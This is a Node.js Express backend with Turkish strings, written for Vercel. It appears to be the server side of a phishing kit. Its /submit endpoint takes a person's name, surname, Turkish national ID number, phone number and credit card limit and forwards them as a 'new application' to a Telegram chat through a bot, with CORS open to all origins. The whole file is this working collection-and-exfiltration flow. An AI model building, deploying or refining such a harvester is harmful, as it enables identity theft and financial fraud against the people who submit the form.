const express = require('express');
const axios = require('axios');
const cors = require('cors');
const dotenv = require('dotenv');

dotenv.config();

const app = express();

// CORS
app.use(cors());
app.use(express.json());

// Ortak header (her cevaba CORS ekleyelim)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

app.get('/', (req, res) => {
  res.json({ message: 'Backend çalışıyor 🚀' });
});

app.post('/submit', async (req, res) => {
  console.log('POST /submit isteği alındı:', req.body);

  const { isim, soyisim, tc, tel, kredi_karti_limiti } = req.body;
  if (!isim || !soyisim || !tc || !tel || !kredi_karti_limiti) {
    return res.status(400).json({ error: 'Tüm alanlar zorunludur.' });
  }

  const message = `
Yeni Başvuru:
İsim: ${isim}
Soyisim: ${soyisim}
T.C. Kimlik No: ${tc}
Telefon: ${tel}
Kredi Kartı Limiti: ${kredi_karti_limiti}
  `;

  try {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    });
    console.log('[Backend] Telegram gönderildi:', response.data);
    res.json({ message: 'Bilgiler Telegram’a gönderildi.' });
  } catch (err) {
    console.error('[Backend] Telegram hatası:', err.message);
    res.status(500).json({ error: 'Telegram mesajı gönderilemedi.' });
  }
});

// Vercel için export
module.exports = app;
